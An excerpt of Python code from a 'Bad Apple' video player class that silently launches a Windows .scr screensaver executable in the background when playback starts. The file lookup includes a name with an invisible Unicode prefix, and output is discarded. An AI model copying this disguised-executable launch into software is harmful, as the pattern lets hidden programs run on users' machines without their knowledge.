...
class BadApplePlayer:
    ...
    def launch_twink_screensaver(self):
        """Launch the Twink.scr screensaver if it exists"""
        # Look for twink.scr with special character prefix
        current_dir = os.path.dirname(os.path.abspath(__file__))
        possible_names = ["Twink.scr", "twink.scr", "‎twink.scr"]
        
        twink_path = None
        for name in possible_names:
            test_path = os.path.join(current_dir, name)
            if os.path.exists(test_path):
                twink_path = test_path
                break
        
        if twink_path:
            try:
                print("Launching Twink screensaver in background...")
                if platform.system() == "Windows":
                    # Launch screensaver in background with proper flags
                    self.twink_process = subprocess.Popen([
                        twink_path, "/s"  # /s flag for screensaver mode
                    ], 
                    ...
                    # For non-Windows systems, try to run as executable
                    self.twink_process = subprocess.Popen([
                        twink_path
                    ], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL,
                    start_new_session=True)
                print("Twink screensaver launched successfully in background!")
                return True
            except Exception as e:
                print(f"Could not launch Twink screensaver: {e}")
                return False
        else:
            print("Twink.scr not found in current directory")
            return False
    
    def stop_twink_screensaver(self):
        """Stop the Twink screensaver process"""
        if self.twink_process:
            try:
                if platform.system() == "Windows":
                    # Use taskkill to forcefully terminate the screensaver
                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(self.twink_process.pid)], 
                                 capture_output=True, check=False)
                else:
                    self.twink_process.terminate()
                self.twink_process = None
                print("Twink screensaver stopped")
            except Exception as e:
                print(f"Error stopping Twink screensaver: {e}")
    ...
    def play_video_enhanced(self):
        ...
        # Launch Twink screensaver
        self.launch_twink_screensaver()
